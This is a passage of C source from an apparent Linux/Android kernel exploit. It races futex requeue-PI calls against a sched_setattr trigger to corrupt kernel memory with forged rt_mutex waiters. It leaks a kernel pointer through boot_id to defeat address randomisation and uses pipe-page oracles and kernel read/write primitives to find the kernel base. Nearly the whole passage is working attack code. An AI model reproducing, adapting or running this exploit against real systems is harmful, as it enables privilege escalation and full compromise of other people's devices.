        atomic_store(&slide_consume_stop, 1);
        return NULL;
      }
#endif
      slide_wait_before_consume(seq);
#if defined(APP_PSELECT_TRIGGER_MAX_AGE_USEC)
      uint64_t pselect_started_ns = atomic_load(&slide_pselect_started_ns);
      pselect_age_usec = pselect_started_ns
          ? (gettime_ns() - pselect_started_ns) / 1000ULL
          : UINT64_MAX;
      if (pselect_age_usec > APP_PSELECT_TRIGGER_MAX_AGE_USEC) {
        pr_info("slide pselect age guard=0 tid=%d age_usec=%llu max=%d; "
                "trigger skipped\n",
                tid, (unsigned long long)pselect_age_usec,
                APP_PSELECT_TRIGGER_MAX_AGE_USEC);
        atomic_store(&slide_consume_stop, 1);
        return NULL;
      }
#endif
#if defined(SLIDE_GUARD_PSELECT_SYSCALL) && SLIDE_GUARD_PSELECT_SYSCALL
      guard_ok = slide_wait_for_pselect_blocked(
          tid, SLIDE_PSELECT_RECHECK_TIMEOUT_USEC,
          SLIDE_PSELECT_WCHAN_CONFIRMATIONS, &guard_elapsed_usec,
          guard_wchan, sizeof(guard_wchan));
      if (!guard_ok) {
        pr_info("slide pselect blocked guard=0 tid=%d elapsed_usec=%zu "
                "wchan=%s; trigger skipped\n",
                tid, guard_elapsed_usec, guard_wchan);
        atomic_store(&slide_consume_stop, 1);
        return NULL;
      }
#endif
#if defined(APP_PSELECT_POST_GUARD_AGE_CHECK) && \
    APP_PSELECT_POST_GUARD_AGE_CHECK && \
    defined(APP_PSELECT_TRIGGER_MAX_AGE_USEC)
      pselect_started_ns = atomic_load(&slide_pselect_started_ns);
      pselect_age_usec = pselect_started_ns
          ? (gettime_ns() - pselect_started_ns) / 1000ULL
          : UINT64_MAX;
      if (pselect_age_usec > APP_PSELECT_TRIGGER_MAX_AGE_USEC) {
        pr_info("slide pselect post-guard age=0 tid=%d age_usec=%llu "
                "max=%d; trigger skipped\n",
                tid, (unsigned long long)pselect_age_usec,
                APP_PSELECT_TRIGGER_MAX_AGE_USEC);
        atomic_store(&slide_consume_stop, 1);
        return NULL;
      }
#endif
    }
#else
    slide_wait_before_consume(seq);
    int tid = atomic_load(&slide_waiter_tid);
#endif

    if (seq == 1) {
      slide_apply_route_fine_delay();
    }

    int calls = atomic_load(&slide_consume_calls);
    int entered = atomic_load(&slide_consume_enter_sched) + 1;
    atomic_store(&slide_consume_enter_sched, entered);
    atomic_store(&slide_consume_calls, calls + 1);
    pr_info("slide consume sched-enter target_tid=%d call=%d "
            "fake_task=%016zx fake_lock=%016zx fake_w0=%016zx\n",
            tid, calls + 1, fake_task, fake_lock, fake_w0);
    *errno_ptr = 0;
    long ret = sched_setattr_tid(tid, (calls % 19) + 1);
    int saved_errno = *errno_ptr;
#if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
    pr_info("slide pselect blocked ready=%d ready_usec=%zu ready_wchan=%s "
            "guard=%d guard_usec=%zu guard_wchan=%s age_usec=%llu tid=%d\n",
            ready_ok, ready_elapsed_usec, ready_wchan,
            guard_ok, guard_elapsed_usec, guard_wchan,
            (unsigned long long)pselect_age_usec, tid);
#endif
    atomic_store(&slide_consume_last_sched_ret, (int)ret);
    atomic_store(&slide_consume_last_sched_errno, saved_errno);
    if (ret == 0) {
      int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
      atomic_store(&slide_consume_sched_ok, sched_ok);
    }
    atomic_store(&slide_consume_stop, 1);
    while (atomic_load(&slide_consume_go)) {
      __asm__ volatile("yield" ::: "memory");
    }
    return NULL;
  }
}

void *slide_waiter_thread(void *arg __attribute__((unused))) {
#ifdef SLIDE_WAITER_CORE
  pin_to_core(SLIDE_WAITER_CORE);
#endif
  int tid = (int)SYSCHK(syscall(SYS_gettid));
  atomic_store(&slide_waiter_tid, tid);

  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&slide_waiter_ready, 1);
  while (!atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += SLIDE_WAIT_NSEC / 1000000000L;
  timeout.tv_nsec += SLIDE_WAIT_NSEC % 1000000000L;
  if (timeout.tv_nsec >= 1000000000L) {
    timeout.tv_sec++;
    timeout.tv_nsec -= 1000000000L;
  }

  atomic_store(&slide_waiter_waiting, 1);
  errno = 0;
  long wait_ret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                           &slide_f_pi_target, 0);
  int wait_errno = errno;
  pr_info("slide wait_requeue_pi ret=%ld errno=%d\n", wait_ret, wait_errno);
  if (wait_ret != -1 || wait_errno != ETIMEDOUT) {
    atomic_store(&slide_route_done, 1);
    return NULL;
  }
  pr_info("slide pi stage=wait-timeout-accepted tid=%d\n", tid);
  atomic_store(&slide_waiter_ok, 1);
  while (!atomic_load(&slide_deadlock_seen)) {
    __asm__ volatile("yield" ::: "memory");
  }
  pr_info("slide pi stage=waiter-unlock-enter tid=%d\n", tid);
  errno = 0;
  long unlock_ret = futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0,
                             NULL, NULL, 0);
  int unlock_errno = errno;
  pr_info("slide pi stage=waiter-unlock-result tid=%d ret=%ld errno=%d\n",
          tid, unlock_ret, unlock_errno);
  if (unlock_ret != 0) {
    pr_error("slide waiter unlock chain errno=%d\n", unlock_errno);
    atomic_store(&slide_route_done, 1);
    return NULL;
  }
  pr_info("slide pi stage=waiter-unlock-return tid=%d\n", tid);
  while (!atomic_load(&slide_owner_acquired)) {
    __asm__ volatile("yield" ::: "memory");
  }
  pr_info("slide pi stage=writer-enter tid=%d\n", tid);

#if defined(SLIDE_STACK_WRITER) && \
    defined(SLIDE_STACK_WRITER_MCAST) && \
    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_MCAST
  slide_mcast_stack_copy();
#elif defined(SLIDE_STACK_WRITER) && \
      defined(SLIDE_STACK_WRITER_SIGRETURN) && \
      SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
  slide_sigreturn_stack_copy();
#elif defined(SLIDE_STACK_WRITER)
#error Unsupported SLIDE_STACK_WRITER value
#else
  slide_pselect_stack_copy();
#endif
  pr_info("slide pi stage=writer-return tid=%d sched_ok=%d window=%d\n",
          tid, atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_stack_write_window));
  atomic_store(&slide_route_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *slide_owner_thread(void *arg __attribute__((unused))) {
  if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide owner lock target errno=%d\n", errno);
    return NULL;
  }
  pr_info("slide pi stage=owner-target-locked tid=%d\n",
          (int)syscall(SYS_gettid));

  while (!atomic_load(&slide_waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&slide_owner_started, 1);
  pr_info("slide pi stage=owner-chain-lock-enter tid=%d\n",
          (int)syscall(SYS_gettid));
  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide owner lock chain errno=%d\n", errno);
    return NULL;
  }
  atomic_store(&slide_owner_acquired, 1);
  pr_info("slide pi stage=owner-chain-lock-return tid=%d\n",
          (int)syscall(SYS_gettid));

  for (;;) {
    sleep(1);
  }
}

int hex_value(char c) {
  if (c >= '0' && c <= '9') {
    return c - '0';
  }
  if (c >= 'a' && c <= 'f') {
    return c - 'a' + 10;
  }
  if (c >= 'A' && c <= 'F') {
    return c - 'A' + 10;
  }
  return -1;
}

uint64_t slide_read_stext(void) {
  char buf[64];
  unsigned char raw[16];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide boot_id read denied errno=%d\n", errno);
    return 0;
  }

  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n < 0) {
    pr_warning("slide boot_id read failed errno=%d\n", saved_errno);
    return 0;
  }
  buf[n] = 0;

  int nibble = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int v = hex_value(buf[i]);
    if (v < 0) {
      continue;
    }
    if (nibble < 0) {
      nibble = v;
      continue;
    }
    raw[out++] = (unsigned char)((nibble << 4) | v);
    nibble = -1;
  }
  if (out != 16) {
    pr_warning("slide short boot_id parse out=%d n=%zd\n", out, n);
    return 0;
  }

  uint64_t leaked = 0;
  for (int i = 0; i < 8; i++) {
    leaked |= (uint64_t)raw[i] << (i * 8);
  }
  if ((leaked >> 48) != 0xffff) {
    pr_warning("slide bad leaked pointer=%016llx\n",
               (unsigned long long)leaked);
    return 0;
  }

  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER_NAME);
  uint64_t stext = leaked - off;
  pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
             getpid(), (unsigned long long)leaked, (unsigned long long)stext);
  pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
             getpid(), (unsigned long long)stext);
  return stext;
}
uint64_t slide_child_leak_stext(void) {
  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));

  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started) ||
         !atomic_load(&slide_consumer_ready)) {
    usleep(1000);
  }
  if (SLIDE_REQUEUE_ARM_USEC) {
    usleep(SLIDE_REQUEUE_ARM_USEC);
  }

  long requeue_ret = 0;
  int requeue_errno = 0;
  int requeue_polls = 0;
  while (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
    requeue_polls++;
    errno = 0;
    requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                           &slide_f_pi_target, 0);
    requeue_errno = errno;
    if (requeue_ret != 0) {
      break;
    }
    if (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
      usleep(SLIDE_REQUEUE_POLL_USEC);
    }
  }
  pr_info("slide cmp_requeue_pi ret=%ld errno=%d polls=%d\n",
          requeue_ret, requeue_errno, requeue_polls);
  if (requeue_ret != -1 || requeue_errno != EDEADLK) {
    return 0;
  }
  atomic_store(&slide_deadlock_seen, 1);

  while (!atomic_load(&slide_route_done)) {
    usleep(1000);
  }
  if (!atomic_load(&slide_waiter_ok)) {
    return 0;
  }

  return slide_read_stext();
}

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
static int slide_child_trigger_write(void) {
  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));

  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started) ||
         !atomic_load(&slide_consumer_ready)) {
    usleep(1000);
  }
  if (SLIDE_REQUEUE_ARM_USEC) {
    usleep(SLIDE_REQUEUE_ARM_USEC);
  }
  pr_info("slide pi stage=cmp-enter waiter_tid=%d\n",
          atomic_load(&slide_waiter_tid));

  long requeue_ret = 0;
  int requeue_errno = 0;
  int requeue_polls = 0;
  while (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
    requeue_polls++;
    errno = 0;
    requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                           &slide_f_pi_target, 0);
    requeue_errno = errno;
    if (requeue_ret != 0) {
      break;
    }
    if (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
      usleep(SLIDE_REQUEUE_POLL_USEC);
    }
  }
  pr_info("slide pi stage=cmp-return ret=%ld errno=%d polls=%d\n",
          requeue_ret, requeue_errno, requeue_polls);
  if (requeue_ret != -1 || requeue_errno != EDEADLK) {
    return 0;
  }
  pr_info("slide pi stage=deadlock-accepted\n");
  atomic_store(&slide_deadlock_seen, 1);
  while (!atomic_load(&slide_route_done)) {
    usleep(1000);
  }
#if defined(APP_ACCEPT_SCHED_TRIGGER) && APP_ACCEPT_SCHED_TRIGGER
  int sched_ok = atomic_load(&slide_consume_sched_ok) != 0;
  int write_window = atomic_load(&slide_stack_write_window) != 0;
  pr_info("slide downstream verification armed sched_ok=%d write_window=%d\n",
          sched_ok, write_window);
  return atomic_load(&slide_waiter_ok) != 0 && sched_ok;
#else
  return atomic_load(&slide_waiter_ok) != 0 &&
         atomic_load(&slide_stack_write_window) != 0;
#endif
}

static int slide_trigger_physical_state(void) {
  pid_t child = SYSCHK(fork());
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(1);
    }
    disable_rseq_for_thread();
    slide_log_child_context();
    _exit(slide_child_trigger_write() ? 0 : 1);
  }
  int status = 0;
  SYSCHK(waitpid(child, &status, 0));
  int ok = WIFEXITED(status) && WEXITSTATUS(status) == 0;
  pr_info("p0 physical write status=%d ok=%d\n", status, ok);
  return ok;
}

#if defined(SLIDE_PHYSICAL_SLOT_DELAYS_USEC)
static const int slide_physical_slot_delays[] = {
  SLIDE_PHYSICAL_SLOT_DELAYS_USEC
};
#endif

static int slide_trigger_physical_slot(size_t slot) {
  if (!select_slide_payload_index(slot)) {
    return 0;
  }

  int base_delay = (int)slide_enter_delay_usec();
#if defined(SLIDE_PHYSICAL_SLOT_DELAYS_USEC)
  int attempts = (int)(sizeof(slide_physical_slot_delays) /
                       sizeof(slide_physical_slot_delays[0]));
#else
  int attempts = 1;
#endif

  for (int attempt = 1; attempt <= attempts; attempt++) {
    int delay = base_delay;
#if defined(SLIDE_PHYSICAL_SLOT_DELAYS_USEC)
    delay = slide_physical_slot_delays[(size_t)(attempt - 1)];
#endif
#if defined(SLIDE_VIRTUAL_BASE_DELAY_USEC)
    if (p0_virtual_base_probe) {
      delay = SLIDE_VIRTUAL_BASE_DELAY_USEC;
    }
#endif
    char delay_arg[16];
    slide_route_nfds = PSELECT_ROUTE_NFDS;
    slide_route_syscall_pad = 0;
    snprintf(delay_arg, sizeof(delay_arg), "%d", delay);
    SYSCHK(setenv("SLIDE_ENTER_DELAY_USEC", delay_arg, 1));
    if (slide_trigger_physical_state()) {
      pr_info("p0 physical slot=%zu write attempt=%d/%d delay=%d nfds=%d "
              "pad=%d\n",
              slot, attempt, attempts, delay, slide_route_nfds,
              slide_route_syscall_pad);
      return 1;
    }
  }

  pr_error("p0 physical slot=%zu write window failed after %d attempt(s)\n",
           slot, attempts);
  return 0;
}

static int slide_restore_physical_oracle(void) {
  int gate_restored =
      slide_trigger_physical_slot(P0_ORACLE_GATE_RESTORE_SLOT);
  int probe_restored =
      slide_trigger_physical_slot(P0_ORACLE_PROBE_RESTORE_SLOT);
  pr_info("p0 physical restore triggers gate=%d probe=%d "
          "gate_page=%016zx probe_page=%016zx\n",
          gate_restored, probe_restored,
          p0_gate_page_struct, p0_probe_page_struct);
  return gate_restored && probe_restored;
}

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
static int app_trigger_fops_slide_slot(size_t slot) {
  static size_t delay_index;
  static const int delays[] = {
    70000, 60000, 80000, 40000, 90000, 50000,
    30000, 20000, 75000, 65000, 85000, 55000,
  };
  if (!select_slide_payload_index(slot)) {
    return 0;
  }
  int delay = 0;
#ifdef APP_FOPS_ROUTE_COARSE_DELAY_USEC
  delay = APP_FOPS_ROUTE_COARSE_DELAY_USEC;
#elif defined(APP_FOPS_PSELECT_DELAY_USEC)
  delay = APP_FOPS_PSELECT_DELAY_USEC;
#elif defined(APP_FOPS_ROUTE_USE_PSELECT_DELAY) && \
    APP_FOPS_ROUTE_USE_PSELECT_DELAY
  const char *forced = getenv("PSELECT_DELAY_USEC");
  if (forced && *forced) {
    char *end = NULL;
    errno = 0;
    long value = strtol(forced, &end, 0);
    if (!errno && end != forced && !*end && value >= 0 &&
        value <= 1000000) {
      delay = (int)value;
    }
  }
#endif
  if (!delay) {
    delay = delays[delay_index % (sizeof(delays) / sizeof(delays[0]))];
  }
  if (!slide_override_route_coarse_delay(&delay)) {
    return 0;
  }
  delay_index++;
  slide_route_fine_delay_ticks = slide_select_route_fine_delay_ticks();
  if (slide_route_fine_delay_ticks == UINT64_MAX) {
    return 0;
  }
  char delay_arg[16];
  snprintf(delay_arg, sizeof(delay_arg), "%d", delay);
  SYSCHK(setenv("SLIDE_ENTER_DELAY_USEC", delay_arg, 1));
  pr_info("app fops slide route slot=%zu parent=%016zx target=%016zx "
          "lock=%016zx delay=%d fine_ticks=%llu\n",
          slot, slide_oracle_parent, slide_oracle_target, fake_lock, delay,
          (unsigned long long)slide_route_fine_delay_ticks);
  app_publish_writer_started();
  return slide_trigger_physical_state();
}

int app_trigger_fops_slide_route(void) {
#if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
    APP_FOPS_REUSE_VERIFIED_PAGE
  return app_trigger_fops_slide_slot(P0_ORACLE_PRODUCTION_SLOT);
#else
  return app_trigger_fops_slide_slot(0);
#endif
}

#if (defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY) || \
    (defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
     APP_FOPS_DATA_ALIAS_DIAG_ONLY)
int app_trigger_fops_oracle_slot(size_t slot) {
  return app_trigger_fops_slide_slot(slot);
}
#endif
#else
int app_trigger_fops_slide_route(void) {
  static size_t delay_index;
  static const int delays[] = {
    70000, 60000, 80000, 40000, 90000, 50000,
    30000, 20000, 75000, 65000, 85000, 55000,
  };
#if defined(APP_CLOSED_FOPS_ROUTE) && APP_CLOSED_FOPS_ROUTE
  slide_oracle_parent = fake_fops;
  slide_oracle_target = data_addr(ASHMEM_MISC_FOPS);
#else
  if (!select_slide_payload_index(0)) {
    return 0;
  }
#endif
  int delay = 0;
#ifdef APP_FOPS_ROUTE_COARSE_DELAY_USEC
  delay = APP_FOPS_ROUTE_COARSE_DELAY_USEC;
#elif defined(APP_FOPS_ROUTE_USE_PSELECT_DELAY) && \
    APP_FOPS_ROUTE_USE_PSELECT_DELAY
  const char *forced = getenv("PSELECT_DELAY_USEC");
  if (forced && *forced) {
    char *end = NULL;
    errno = 0;
    long value = strtol(forced, &end, 0);
    if (!errno && end != forced && !*end && value >= 0 &&
        value <= 1000000) {
      delay = (int)value;
    }
  }
#endif
  if (!delay) {
    delay = delays[delay_index % (sizeof(delays) / sizeof(delays[0]))];
  }
  if (!slide_override_route_coarse_delay(&delay)) {
    return 0;
  }
  delay_index++;
  slide_route_fine_delay_ticks = slide_select_route_fine_delay_ticks();
  if (slide_route_fine_delay_ticks == UINT64_MAX) {
    return 0;
  }
  char delay_arg[16];
  snprintf(delay_arg, sizeof(delay_arg), "%d", delay);
  SYSCHK(setenv("SLIDE_ENTER_DELAY_USEC", delay_arg, 1));
  pr_info("app fops slide route parent=%016zx target=%016zx lock=%016zx "
          "configured_delay=%d consume_delay=%u fine_ticks=%llu\n",
          slide_oracle_parent, slide_oracle_target, fake_lock, delay,
          (unsigned int)slide_enter_delay_usec(),
          (unsigned long long)slide_route_fine_delay_ticks);
  app_publish_writer_started();
  return slide_trigger_physical_state();
}
#endif

static int slide_leak_physical_base(void) {
  size_t started = gettime_ns();
  if (!prepare_p0_pipe_oracle()) {
    pr_error("p0 physical pipe preparation failed\n");
    return 0;
  }
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
#ifdef APP_SLIDE_FRESH_PAGE_ATTEMPTS
  const int fresh_page_attempts = APP_SLIDE_FRESH_PAGE_ATTEMPTS;
#else
  const int fresh_page_attempts = 1;
#endif
  int fresh_attempt = 1;
  int search_batch = 0;
#ifdef APP_SLIDE_KERNEL_PAGE_SEARCH_BATCHES
  const int max_search_batches = APP_SLIDE_KERNEL_PAGE_SEARCH_BATCHES;
#else
  const int max_search_batches = fresh_page_attempts;
#endif
  int refresh_oracle = 0;
  while (fresh_attempt <= fresh_page_attempts &&
         search_batch < max_search_batches) {
#if defined(APP_P0_REFRESH_ORACLE_EACH_FRESH_PAGE) && \
    APP_P0_REFRESH_ORACLE_EACH_FRESH_PAGE
    if (refresh_oracle) {
      reset_pipe_attempt();
      if (!prepare_p0_pipe_oracle()) {
        pr_error("p0 physical pipe refresh failed fresh=%d/%d\n",
                 fresh_attempt, fresh_page_attempts);
        return 0;
      }
      pr_info("p0 pipe oracle refreshed fresh=%d/%d base=%016zx\n",
              fresh_attempt, fresh_page_attempts, pipebuf_page_base);
      refresh_oracle = 0;
    }
#endif
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    search_batch++;
    pr_info("p0 page search batch=%d/%d gate_attempt=%d/%d base=%016zx\n",
            search_batch, max_search_batches, fresh_attempt,
            fresh_page_attempts, page_base);
    pr_info("p0 fresh page attempt=%d/%d base=%016zx\n",
            fresh_attempt, fresh_page_attempts, page_base);
    if (!page_base) {
#ifndef APP_SLIDE_KERNEL_PAGE_SEARCH_BATCHES
      fresh_attempt++;
      refresh_oracle = 1;
#endif
      continue;
    }
    if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
      pr_error("p0 physical pipe gate trigger failed fresh=%d/%d\n",
               fresh_attempt, fresh_page_attempts);
      fresh_attempt++;
      refresh_oracle = 1;
      continue;
    }
    int gate_result = verify_p0_pipe_oracle_gate();
    pr_info("p0 fresh page result=%d attempt=%d/%d\n",
            gate_result, fresh_attempt, fresh_page_attempts);
    if (getenv("P0_ORACLE_GATE_DIAG")) {
      pr_info("p0 physical gate diagnostic result=%d\n", gate_result);
      if (gate_result != 0) {
        slide_restore_physical_oracle();
      }
      return 0;
    }
    if (gate_result == 0) {
      pr_warning("p0 physical pipe reclaim miss fresh=%d/%d\n",
                 fresh_attempt, fresh_page_attempts);
      fresh_attempt++;
      refresh_oracle = 1;
      continue;
    }
    app_publish_p0_dirty();
    if (gate_result < 0) {
      pr_error("p0 physical pipe gate changed unexpected pages\n");
      slide_restore_physical_oracle();
      return 0;
    }
    if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
      slide_restore_physical_oracle();
      return 0;
    }
    uintptr_t offset = scan_p0_pipe_oracle();
    if (offset == (uintptr_t)-1) {
      slide_restore_physical_oracle();
      return 0;
    }
#if defined(APP_P0_FINGERPRINT_INVERSE_SLIDE) && \
    APP_P0_FINGERPRINT_INVERSE_SLIDE
    if (offset > P0_ORACLE_PROBE_OFFSET) {
      pr_error("p0 fingerprint source offset exceeds probe source=%08zx "
               "probe=%08llx\n",
               offset, (unsigned long long)P0_ORACLE_PROBE_OFFSET);
      slide_restore_physical_oracle();
      return 0;
    }
    uintptr_t source_offset = offset;
    offset = P0_ORACLE_PROBE_OFFSET - source_offset;
    pr_info("p0 fingerprint inverse source_offset=%08zx probe=%08llx "
            "runtime_slide=%08zx\n",
            source_offset, (unsigned long long)P0_ORACLE_PROBE_OFFSET,
            offset);
#endif
    if (!slide_restore_physical_oracle()) {
      return 0;
    }
    slide_p0_session_fresh = 1;
    size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
    pr_success("p0 physical elapsed_ms=%zu fresh=%d/%d\n",
               elapsed_ms, fresh_attempt, fresh_page_attempts);
    return slide_commit_stext(KIMAGE_TEXT_BASE + offset, "physical");
  }
  return 0;
#else
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
  if (!page_base) {
    return 0;
  }
  if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
    pr_error("p0 physical pipe gate trigger failed\n");
    return 0;
  }
  int gate_result = verify_p0_pipe_oracle_gate();
  if (getenv("P0_ORACLE_GATE_DIAG")) {
    pr_info("p0 physical gate diagnostic result=%d\n", gate_result);
    if (gate_result != 0) {
      slide_restore_physical_oracle();
    }
    return 0;
  }
  if (gate_result == 0) {
    pr_warning("p0 physical pipe reclaim miss\n");
    return 0;
  }
  app_publish_p0_dirty();
  if (gate_result < 0) {
    pr_error("p0 physical pipe gate changed unexpected pages\n");
    slide_restore_physical_oracle();
    return 0;
  }
  if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
    slide_restore_physical_oracle();
    return 0;
  }
  uintptr_t offset = scan_p0_pipe_oracle();
  if (offset == (uintptr_t)-1) {
    slide_restore_physical_oracle();
    return 0;
  }
  if (!slide_restore_physical_oracle()) {
    return 0;
  }
  size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
  pr_success("p0 physical elapsed_ms=%zu\n", elapsed_ms);
  return slide_commit_stext(KIMAGE_TEXT_BASE + offset, "physical");
#endif
}

#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
static int slide_leak_virtual_base(uintptr_t physical_offset) {
  size_t started = gettime_ns();
  uint64_t ashmem_fops = 0;
  int gate_result = 0;
  int restore_needed = 0;
  int restore_ok = 0;
  int success = 0;
  slide_p0_offset = physical_offset;
  p0_virtual_base_probe = 1;

  if (!prepare_p0_pipe_oracle()) {
    pr_error("p0 virtual pipe preparation failed\n");
    goto out;
  }
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
  if (!page_base) {
    goto out;
  }
  /* Any attempted rt_mutex write makes this supervisor attempt non-retryable. */
  app_publish_p0_dirty();
  if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
    pr_error("p0 virtual pipe gate trigger failed\n");
    goto out;
  }
  gate_result = verify_p0_pipe_oracle_gate();
  if (gate_result != 1) {
    pr_error("p0 virtual pipe reclaim gate=%d\n", gate_result);
    if (gate_result != 0) {
      restore_needed = 1;
    }
    goto out;
  }
  restore_needed = 1;
  if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
    goto out;
  }
  ashmem_fops = scan_p0_virtual_base_pointer();

out:
  if (restore_needed) {
    restore_ok = slide_restore_physical_oracle();
  }
  p0_virtual_base_probe = 0;
  if (!restore_ok || ashmem_fops <= ASHMEM_FOPS_OFF) {
    return 0;
  }

  uint64_t base = ashmem_fops - ASHMEM_FOPS_OFF;
  if (base > UINT64_MAX - ASHMEM_FOPS_OFF ||
      base + ASHMEM_FOPS_OFF != ashmem_fops) {
    return 0;
  }
  size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
  pr_success("p0 virtual elapsed_ms=%zu ashmem_fops=%016llx "
             "base=%016llx\n", elapsed_ms,
             (unsigned long long)ashmem_fops,
             (unsigned long long)base);
  success = slide_commit_virtual_base(base, "physical-data");
  return success;
}
#endif

static void dump_p0_oracle_words(int fd, const char *phase,
                                 uintptr_t address, size_t count) {
  for (size_t index = 0; index < count; index++) {
    uintptr_t current = address + index * sizeof(uint64_t);
    uint64_t value = kernel_read64(fd, current);
    pr_info("p0 diagnostic %s addr=%016zx value=%016llx\n",
            phase, current, (unsigned long long)value);
  }
}

static int p0_diag_write32(int fd, uintptr_t address, uint32_t value) {
  return kernel_write_data(fd, address, &value, sizeof(value)) ==
         (ssize_t)sizeof(value);
}

static int p0_diag_write64(int fd, uintptr_t address, uint64_t value) {
  return kernel_write_data(fd, address, &value, sizeof(value)) ==
         (ssize_t)sizeof(value);
}

static int prepare_p0_diag_waiter(int fd, uintptr_t waiter,
                                  uintptr_t parent, uintptr_t target,
                                  uintptr_t task, uintptr_t lock) {
  if (!p0_diag_write64(fd, waiter + 0x00, 1) ||
      !p0_diag_write64(fd, waiter + 0x08, 0) ||
      !p0_diag_write64(fd, waiter + 0x10, 0)) {
    return 0;
  }
#if LEGACY_RT_MUTEX_WAITER || COMPACT_RT_MUTEX_WAITER
  return p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
                         parent) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08,
                         0) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10,
                         target) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_TASK_OFF, task) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_LOCK_OFF, lock) &&
#if COMPACT_RT_MUTEX_WAITER
         p0_diag_write32(fd, waiter + FAKE_WAITER_WAKE_STATE_OFF, 0) &&
#endif
         p0_diag_write32(fd, waiter + FAKE_WAITER_PRIO_OFF,
                         SLIDE_FAKE_WAITER_PRIO) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_DEADLINE_OFF, 0)
#if COMPACT_RT_MUTEX_WAITER
         && p0_diag_write64(fd, waiter + FAKE_WAITER_WW_CTX_OFF, 0)
#endif
         ;
#else
  return p0_diag_write32(fd, waiter + FAKE_WAITER_TREE_PRIO_OFF,
                         SLIDE_FAKE_WAITER_PRIO) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_TREE_DEADLINE_OFF, 0) &&
         /* pi_tree_entry's parent_color must be NULL so rb_next()'s
          * parent-climb (from rb_erase_cached's leftmost update) terminates
          * instead of walking into the page's other crafted content. */
         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
                         0) &&
         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08,
                         0) &&
